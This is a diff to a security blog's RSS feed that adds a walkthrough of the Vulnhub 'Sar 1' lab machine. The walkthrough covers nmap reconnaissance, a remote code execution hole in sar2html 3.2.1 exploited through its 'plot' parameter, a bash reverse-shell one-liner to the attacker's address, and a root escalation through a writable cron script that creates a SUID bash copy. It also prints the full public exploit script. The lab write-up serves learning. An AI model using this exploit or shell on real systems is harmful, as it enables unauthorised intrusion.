@@ -1,4 +1,106 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vulnhub on ikuamike</title><link>https://blog.ikuamike.io/tags/vulnhub/</link><description>Recent content in Vulnhub on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Wed, 21 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/vulnhub/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vulnhub on ikuamike</title><link>https://blog.ikuamike.io/tags/vulnhub/</link><description>Recent content in Vulnhub on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Thu, 13 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/vulnhub/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Sar 1</title><link>https://blog.ikuamike.io/posts/2021/sar1/</link><pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/sar1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/sar1/sar1.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>In this box there&amp;rsquo;s only one port open that is running a vulnerable version of sar2html that
+we take advantage of to get a low priv shell. For privilege escalation there was a cron job
+running as root that was running a script we could write in.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.107
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.000040s latency&lt;span style="color:#f92672">)&lt;/span>.
+Not shown: &lt;span style="color:#ae81ff">65534&lt;/span> closed ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+MAC Address: 08:00:27:48:00:F5 &lt;span style="color:#f92672">(&lt;/span>Oracle VirtualBox virtual NIC&lt;span style="color:#f92672">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
+&lt;p>Using nmap scripts we see the existence of robots.txt&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.107
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00042s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+| http-enum:
+| /robots.txt: Robots file
+|_ /phpinfo.php: Possible information file
+|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>From this we discover sar2HTML.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-01.png" class="center" style="border-radius: 8px;" />
+&lt;p>Visiting this directory I get the version of sar2html as 3.2.1.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-02.png" class="center" style="border-radius: 8px;" />
+&lt;p>Checking on searchsploit, a remote command execution vulnerability exists for this version.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">searchsploit sar2html
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-03.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-user">Shell as user&lt;/h1>
+&lt;p>By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.&lt;/p>
+&lt;p>script url: &lt;a href="https://www.exploit-db.com/exploits/49344" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49344&lt;/a>
+&lt;/p>
+&lt;pre>&lt;code>~/Vulnhub/Sar1  python3 49344.py
+Enter The url =&amp;gt; http://192.168.56.107/sar2HTML/
+Command =&amp;gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Command =&amp;gt; /bin/bash+-c+'/bin/bash+-i+&amp;gt;%26+/dev/tcp/192.168.56.1/9000+0&amp;gt;%261'
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-04.png" class="center" style="border-radius: 8px;" />
+&lt;p>Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
+I found a cron job running as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-05.png" class="center" style="border-radius: 8px;" />
+&lt;p>While we can&amp;rsquo;t write to this file, the script being executed inside it is writeable.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-06.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;p>By writing into write.sh using vi, we can escalate our privileges.&lt;/p>
+&lt;pre>&lt;code>#!/bin/sh
+cp /bin/bash /var/www/html/suidbash
+chmod u+s /var/www/html/suidbash
+&lt;/code>&lt;/pre>&lt;p>This will create a copy of the bash binary and add suid permissions to it.&lt;/p>
+&lt;p>Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-07.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>Understanding the exploit script and perform the exploit manually.&lt;/p>
+&lt;p>To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e"># Exploit Title: sar2html 3.2.1 - &amp;#39;plot&amp;#39; Remote Code Execution&lt;/span>
+&lt;span style="color:#75715e"># Date: 27-12-2020&lt;/span>
+&lt;span style="color:#75715e"># Exploit Author: Musyoka Ian&lt;/span>
+&lt;span style="color:#75715e"># Vendor Homepage:https://github.com/cemtan/sar2html&lt;/span>
+&lt;span style="color:#75715e"># Software Link: https://sourceforge.net/projects/sar2html/&lt;/span>
+&lt;span style="color:#75715e"># Version: 3.2.1&lt;/span>
+&lt;span style="color:#75715e"># Tested on: Ubuntu 18.04.1&lt;/span>
+&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;span style="color:#f92672">import&lt;/span> re
+&lt;span style="color:#f92672">from&lt;/span> cmd &lt;span style="color:#f92672">import&lt;/span> Cmd
+url &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Enter The url =&amp;gt; &amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Terminal&lt;/span>(Cmd):
+prompt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Command =&amp;gt; &amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">default&lt;/span>(self, args):
+exploiter(args)
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exploiter&lt;/span>(cmd):
+&lt;span style="color:#66d9ef">global&lt;/span> url
+sess &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>session()
+output &lt;span style="color:#f92672">=&lt;/span> sess&lt;span style="color:#f92672">.&lt;/span>get(f&lt;span style="color:#e6db74">&amp;#34;{url}/index.php?plot=;{cmd}&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">try&lt;/span>:
+out &lt;span style="color:#f92672">=&lt;/span> re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;option value=(.*?)&amp;gt;&amp;#34;&lt;/span>, output&lt;span style="color:#f92672">.&lt;/span>text)
+&lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;Error!!&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">for&lt;/span> ouut &lt;span style="color:#f92672">in&lt;/span> out:
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;There is no defined host...&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;null selected&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;selected&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
+&lt;span style="color:#66d9ef">print&lt;/span> (ouut)
+&lt;span style="color:#66d9ef">print&lt;/span> ()
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>):
+terminal &lt;span style="color:#f92672">=&lt;/span> Terminal()
+terminal&lt;span style="color:#f92672">.&lt;/span>cmdloop()&lt;span style="color:#f92672">%&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>According to the script the vulnerable parameter is plot and simply takes in our command and executes it.&lt;/p>
+&lt;p>When interacting with the application you can select OS, when you pick one the plot parameter is used.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-08.png" class="center" style="border-radius: 8px;" />
+&lt;p>Here we can inject the command we want and execute shell commands. The OS option doesn&amp;rsquo;t matter, anything after
+the semi-colon &lt;code>;&lt;/code> will be executed. For the reverse shell command remember to url encode special chars like I did
+above&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-09.png" class="center" style="border-radius: 8px;" />
+&lt;p>Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.&lt;/p>
+&lt;p>&lt;a href="https://musyokaian.medium.com/" target="_blank" rel="noopener">https://musyokaian.medium.com/&lt;/a>
+&lt;/p></content></item><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
 &lt;table>
 &lt;thead>
 &lt;tr>
